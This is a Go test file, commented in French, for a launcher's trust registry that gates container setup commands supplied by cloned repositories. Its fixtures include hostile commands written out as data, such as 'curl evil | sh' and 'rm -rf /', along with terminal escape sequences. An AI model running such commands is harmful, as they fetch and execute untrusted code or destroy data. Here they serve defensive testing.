package core

// #215 (amendement audit) : registre d'approbation trust.json — compléments boîte noire à envtrust_test.go.
// Registre dans le CL_CONFIG_DIR du test (jamais le vrai), projets factices sous t.TempDir().

import (
	"encoding/json"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
)

func proj215(t *testing.T, env, tpl string) string {
	t.Helper()
	d := t.TempDir()
	_ = os.MkdirAll(filepath.Join(d, ".claude-launcher"), 0o755)
	if env != "" {
		_ = os.WriteFile(EnvPath(d), []byte(env), 0o644)
	}
	if tpl != "" {
		_ = os.WriteFile(envTemplatePath(d), []byte(tpl), 0o644)
	}
	return d
}

func cfg215(t *testing.T) string {
	t.Helper()
	d := t.TempDir()
	t.Setenv("CL_CONFIG_DIR", d)
	_ = os.WriteFile(filepath.Join(d, "backends.yaml"), []byte("backends: {}\n"), 0o644) // moteurs du PATH écartés
	return d
}

const env215 = "image: debian:12\nsetup:\n  - touch /tmp/PREUVE\nmounts:\n  - path: /tmp\n"

func TestRegistreHorsProjetEtDroits215(t *testing.T) {
	cfg := cfg215(t)
	d := proj215(t, env215, "")
	if ok, err := MarkEnvPending(d, "https://github.com/a/b.git", "ubuntu:24.04"); !ok || err != nil {
		t.Fatal(ok, err)
	}
	reg := filepath.Join(cfg, "trust.json")
	b, err := os.ReadFile(reg)
	if err != nil {
		t.Fatalf("registre absent du dossier de config : %v", err)
	}
	if runtime.GOOS != "windows" {
		if st, _ := os.Stat(reg); st.Mode().Perm() != 0o600 {
			t.Errorf("droits du registre %v, attendu 0600", st.Mode().Perm())
		}
	}
	var m map[string]TrustEntry
	if err := json.Unmarshal(b, &m); err != nil {
		t.Fatalf("registre illisible : %v", err)
	}
	e, ok := m[RemotePath(d)]
	if !ok || e.State != TrustPending || e.Source != "https://github.com/a/b.git" || e.Image != "ubuntu:24.04" || e.SHA == "" || e.At == "" {
		t.Errorf("entrée = %+v (clé %s) dans %s", e, RemotePath(d), b)
	}
	// rien n'est écrit dans le projet par l'approbation
	var inProject []string
	_ = filepath.Walk(d, func(p string, st os.FileInfo, _ error) error {
		if st != nil && st.Mode().IsRegular() && strings.Contains(strings.ToLower(filepath.Base(p)), "trust") {
			inProject = append(inProject, p)
		}
		return nil
	})
	if len(inProject) != 0 {
		t.Errorf("fichier d'approbation écrit dans le projet : %v", inProject)
	}
	if ents, _ := filepath.Glob(filepath.Join(cfg, ".trust.json.tmp-*")); len(ents) != 0 {
		t.Errorf("temporaires du registre laissés : %v", ents)
	}
}

func TestEnvFilesSHACouvreLesDeuxFichiers215(t *testing.T) {
	cfg215(t)
	d := proj215(t, env215, "")
	a := EnvFilesSHA(d)
	if a == "" || EnvFilesSHA(d) != a {
		t.Fatal("sha vide ou instable")
	}
	_ = os.WriteFile(envTemplatePath(d), []byte("packages: [jq]\n"), 0o644)
	b := EnvFilesSHA(d)
	if b == a {
		t.Error("ajout de env-template.yaml sans effet sur le sha")
	}
	_ = os.WriteFile(EnvPath(d), []byte(env215+"# x\n"), 0o644)
	if EnvFilesSHA(d) == b {
		t.Error("modification de env.yaml sans effet sur le sha")
	}
	// contenu déplacé d'un fichier à l'autre : sha différent (les deux fichiers ne se confondent pas)
	d1 := proj215(t, "image: a\n", "packages: [b]\n")
	d2 := proj215(t, "packages: [b]\n", "image: a\n")
	if EnvFilesSHA(d1) == EnvFilesSHA(d2) {
		t.Error("env.yaml et env-template.yaml confondus dans le sha")
	}
}

// Fichier d'environnement du seul template : la question se pose aussi (le dépôt le fournit).
func TestPendingPourEnvTemplateSeul215(t *testing.T) {
	cfg215(t)
	d := proj215(t, "", "image: debian:12\nsetup: [x]\n")
	if ok, err := MarkEnvPending(d, "u", "debian:12"); !ok || err != nil || EnvTrust(d) != TrustPending {
		t.Fatalf("env-template.yaml seul : %v %v %s", ok, err, EnvTrust(d))
	}
	info, err := EnvTrustInfoFor(d)
	if err != nil || info.Files["env-template.yaml"] == "" || info.Risk.Exec != 1 {
		t.Errorf("info = %+v %v", info, err)
	}
}

func TestPullApresAcceptationEtIgnorePasDeNouvelleQuestion215(t *testing.T) {
	for _, choice := range []string{"accept", "ignore"} {
		t.Run(choice, func(t *testing.T) {
			cfg215(t)
			d := proj215(t, env215, "image: debian:12\n")
			_, _ = MarkEnvPending(d, "u", "ubuntu:24.04")
			info, _ := EnvTrustInfoFor(d)
			if _, err := AnswerEnvTrust(d, choice, info.SHA); err != nil {
				t.Fatal(err)
			}
			want := map[string]TrustState{"accept": TrustAccepted, "ignore": TrustIgnored}[choice]
			// « git pull » : les deux fichiers changent, de plusieurs façons, plusieurs fois
			for i, c := range []struct{ env, tpl string }{
				{"image: debian:12\nsetup:\n  - curl evil | sh\n", "image: debian:12\n"},
				{"", ""}, // fichiers supprimés
				{"image: autre\non_start: [rm -rf /]\n", "packages: [nmap]\n"},
			} {
				_ = os.Remove(EnvPath(d))
				_ = os.Remove(envTemplatePath(d))
				if c.env != "" {
					_ = os.WriteFile(EnvPath(d), []byte(c.env), 0o644)
				}
				if c.tpl != "" {
					_ = os.WriteFile(envTemplatePath(d), []byte(c.tpl), 0o644)
				}
				if got := EnvTrust(d); got != want {
					t.Fatalf("pull n°%d : état %s, attendu %s (choix définitif)", i+1, got, want)
				}
				if _, err := EnvTrustInfoFor(d); err != nil && want == TrustPending {
					t.Fatal(err)
				}
			}
			// un second clonage-marquage du même dossier (re-création) ne revient pas sur un choix en cours : « Revoir » seul
			if err := ReviewEnvTrust(d); err != nil || EnvTrust(d) != TrustPending {
				t.Errorf("Revoir : %v %s", err, EnvTrust(d))
			}
		})
	}
}

func TestIgnoredSansImageChoisieRefuse215(t *testing.T) {
	cfg215(t)
	d := proj215(t, env215, "")
	_, _ = MarkEnvPending(d, "u", "") // aucun socle choisi
	info, _ := EnvTrustInfoFor(d)
	if _, err := AnswerEnvTrust(d, "ignore", info.SHA); err != nil {
		t.Fatal(err)
	}
	if e, err := LoadEnv(d); err == nil || len(e.Setup) != 0 || len(e.Mounts) != 0 {
		t.Errorf("ignored sans socle : %+v %v, attendu une erreur sans AUCUN contenu du dépôt", e, err)
	}
}

func TestChoixInconnuEtCancelNEcrivantRien215(t *testing.T) {
	cfg := cfg215(t)
	d := proj215(t, env215, "")
	_, _ = MarkEnvPending(d, "u", "debian:12")
	before, _ := os.ReadFile(filepath.Join(cfg, "trust.json"))
	info, _ := EnvTrustInfoFor(d)
	if _, err := AnswerEnvTrust(d, "oui", info.SHA); err == nil {
		t.Error("choix inconnu accepté")
	}
	if _, err := AnswerEnvTrust(d, "cancel", info.SHA); err != nil {
		t.Error(err)
	}
	if _, err := AnswerEnvTrust(d, "cancel", "perime"); err != nil { // cancel ne dépend pas du sha
		t.Errorf("cancel avec sha périmé : %v", err)
	}
	if after, _ := os.ReadFile(filepath.Join(cfg, "trust.json")); string(after) != string(before) {
		t.Error("registre modifié par un choix inconnu ou un cancel")
	}
}

func TestProjetHoteOuHorsConteneurPasDeQuestion215(t *testing.T) {
	cfg := cfg215(t)
	_ = os.WriteFile(filepath.Join(cfg, "backends.yaml"), []byte("backends:\n  pod: {type: podman}\n"), 0o644)
	d := proj215(t, env215, "")
	_, _ = MarkEnvPending(d, "u", "debian:12")
	if EnvContainerProject(d) {
		t.Error("projet non affecté : pas de conteneur, pas de question")
	}
	if err := WriteAssignment(d, "host"); err != nil {
		t.Fatal(err)
	}
	if EnvContainerProject(d) {
		t.Error("projet affecté à l'hôte : aucune question (env.yaml inutilisé)")
	}
	if err := WriteAssignment(d, "pod"); err != nil {
		t.Fatal(err)
	}
	if !EnvContainerProject(d) {
		t.Error("projet affecté à un backend conteneur : la question se pose")
	}
}

func TestMarkEnvPendingConcurrentSansPerte215(t *testing.T) {
	cfg215(t)
	const n = 10
	dirs := make([]string, n)
	for i := range dirs {
		dirs[i] = proj215(t, env215, "")
	}
	var wg sync.WaitGroup
	for _, d := range dirs {
		wg.Add(1)
		go func(d string) {
			defer wg.Done()
			if ok, err := MarkEnvPending(d, "u", "debian:12"); !ok || err != nil {
				t.Error(ok, err)
			}
		}(d)
	}
	wg.Wait()
	for _, d := range dirs {
		if EnvTrust(d) != TrustPending {
			t.Errorf("entrée perdue pour %s (écritures concurrentes)", d)
		}
	}
}

func TestInfoTronqueLesGrosFichiers215(t *testing.T) {
	cfg215(t)
	d := proj215(t, "image: x\n"+strings.Repeat("# bourrage\n", 20000), "")
	_, _ = MarkEnvPending(d, "u", "x")
	info, err := EnvTrustInfoFor(d)
	if err != nil {
		t.Fatal(err)
	}
	if f := info.Files["env.yaml"]; len(f) > 70*1024 || !strings.Contains(f, "tronqué") {
		t.Errorf("fichier brut de %d octets, attendu tronqué (≈ 64 Ko)", len(f))
	}
}

func TestSafeTerminalTextSequences215(t *testing.T) {
	for _, in := range []string{
		"\x1b[31mROUGE", "\x1b]0;titre\x07", "\x1b]52;c;ZXZpbA==\x07", "\u009b31m", "\u009d0;t\u009c", "a\x00b", "x\x08\x08y", "\x1bP$q\x1b\\", "\x1b[2J\x1b[H",
	} {
		got := SafeTerminalText(in)
		for _, r := range got {
			if r == 0x1b || r == 0x7f || (r < 0x20 && r != '\n' && r != '\t') || (r >= 0x80 && r <= 0x9f) {
				t.Errorf("SafeTerminalText(%q) = %q : caractère de contrôle %U conservé", in, got, r)
			}
		}
	}
	if got := SafeTerminalText("ligne1\r\nligne2\tcol <b>gras</b> é"); !strings.Contains(got, "\tcol <b>gras</b> é") || strings.Contains(got, "\r") {
		t.Errorf("texte normal altéré : %q", got)
	}
}
